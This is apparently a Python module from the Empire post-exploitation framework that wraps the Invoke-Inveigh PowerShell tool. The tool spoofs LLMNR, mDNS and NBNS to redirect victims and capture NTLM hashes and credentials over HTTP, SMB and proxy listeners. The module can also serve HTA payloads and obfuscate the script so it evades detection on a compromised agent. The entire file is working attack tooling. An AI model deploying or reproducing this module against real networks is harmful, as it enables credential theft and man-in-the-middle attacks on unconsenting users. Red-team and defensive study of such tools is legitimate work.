from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Inveigh',

            'Author': ['Kevin Robertson'],

            'Description': ('Inveigh is a Windows PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool. Note '
                            'that this module exposes only a subset of Inveigh\'s parameters. Inveigh can be used '
                            'through Empire\'s scriptimport and scriptcmd if additional parameters are needed.'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,
			
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/Kevin-Robertson/Inveigh'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
			'ConsoleOutput' : {
                'Description'   :   '(Low/Medium/Y) Default = Y: Enable/Disable real time console output. Medium and Low can be used to reduce output.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ConsoleStatus' : {
                'Description'   :   'Interval in minutes for displaying all unique captured hashes and credentials. This will display a clean list of captures in Empire.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ConsoleUnique' : {
                'Description'   :   '(Y/N) Default = Y: Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname, and username combinations.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'ElevatedPrivilege' : {
                'Description'   :   '(Auto/Y/N) Default = Auto: Set the privilege mode. Auto will determine if Inveigh is running with elevated privilege. If so, options that require elevated privilege can be used.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'HTTP' : {
                'Description'   :   '(Y/N) Default = Y: Enable/Disable HTTP challenge/response capture.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'HTTPAuth' : {
                'Description'   :   '(Anonymous/Basic/NTLM/NTLMNoESS) HTTP listener authentication type. This setting does not apply to wpad.dat requests.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'HTTPContentType' : {
                'Description'   :   'Content type for HTTP/Proxy responses. Does not apply to EXEs and wpad.dat. Set to "application/hta" for HTA files or when using HTA code with HTTPResponse.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'HTTPResponse' : {
                'Description'   :   'Content to serve as the default HTTP/Proxy response. This response will not be used for wpad.dat requests. Use PowerShell escape characters and newlines where necessary. This paramater will be wrapped in double quotes by this module.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'Inspect' : {
                'Description'   :   '(Switch) Inspect LLMNR, mDNS, and NBNS traffic only.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'IP' : {
                'Description'   :   'Local IP address for listening and packet sniffing. This IP address will also be used for LLMNR/mDNS/NBNS spoofing if the SpooferIP parameter is not set.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'LLMNR' : {
                'Description'   :   '(Y/N) Default = Y: Enable/Disable LLMNR spoofer.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'mDNS' : {
                'Description'   :   '(Y/N) Enable/Disable mDNS spoofer.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'mDNSTypes' : {
                'Description'   :   '(QU,QM) Default = QU: Comma separated list of mDNS types to spoof. Note that QM will send the response to 224.0.0.251.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'NBNS' : {
                'Description'   :   '(Y/N) Enable/Disable NBNS spoofer.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'NBNSTypes' : {
                'Description'   :   'Default = 00,20: Comma separated list of NBNS types to spoof.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'Proxy' : {
                'Description'   :   '(Y/N) Enable/Disable Inveigh\'s proxy server authentication capture.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'ProxyPort' : {
                'Description'   :   'Default = 8492: TCP port for the Inveigh\'s proxy listener.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'RunCount' : {
                'Description'   :   'Number of NTLMv1/NTLMv2 captures to perform before auto-exiting.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'RunTime' : {
                'Description'   :   'Run time duration in minutes.',
                'Required'      :   True,
                'Value'         :   ''
            },
			'SMB' : {
                'Description'   :   '(Y/N) Default = Y: Enable/Disable SMB challenge/response capture.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferIP' : {
                'Description'   :   'Response IP address for spoofing. This parameter is only necessary when redirecting victims to a system other than the Inveigh host.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferHostsIgnore' : {
                'Description'   :   'Comma separated list of requested hostnames to ignore when spoofing.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferHostsReply' : {
                'Description'   :   'Comma separated list of requested hostnames to respond to when spoofing.',
                'Required'      :   False,
                'Value'         :   ''
            },
			'SpooferIPsIgnore' : {
                'Description'   :   'Comma separated list of source IP addresses to ignore when spoofing.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferIPsReply' : {
                'Description'   :   'Comma separated list of source IP addresses to respond to when spoofing.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferLearning' : {
                'Description'   :   '(Y/N) Enable/Disable LLMNR/NBNS valid host learning.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferLearningDelay' : {
                'Description'   :   'Time in minutes that Inveigh will delay spoofing while valid hosts are being blacklisted through SpooferLearning.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SpooferRepeat' : {
                'Description'   :   '(Y/N) Default = Y: Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WPADAuth' : {
                'Description'   :   '(Anonymous/Basic/NTLM/NTLMNoESS) HTTP listener authentication type for wpad.dat requests.',
                'Required'      :   False,
                'Value'         :   ''
            }
			
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Invoke-Inveigh.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # set defaults for Empire
        scriptEnd = "\n" + 'Invoke-Inveigh -Tool "2"'

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        if "," in str(values['Value']):
                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
                            scriptEnd += " -" + str(option) + " " + quoted
                        else:
                            scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
